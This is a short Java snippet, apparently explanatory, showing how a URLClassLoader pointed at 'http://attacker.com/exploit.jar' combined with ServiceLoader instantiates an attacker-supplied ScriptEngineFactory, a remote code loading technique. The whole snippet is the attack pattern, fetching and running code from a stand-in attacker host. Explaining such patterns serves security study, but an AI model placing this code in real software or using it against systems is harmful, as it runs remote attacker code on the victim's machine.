// Attacker places META-INF/services/javax.script.ScriptEngineFactory in remote JAR
URL[] urls = {new URL("http://attacker.com/exploit.jar")};
URLClassLoader cl = new URLClassLoader(urls);
ServiceLoader<ScriptEngineFactory> loader =
    ServiceLoader.load(ScriptEngineFactory.class, cl);
for (ScriptEngineFactory factory : loader) {
    factory.getScriptEngine(); // Attacker's factory instantiated here
}
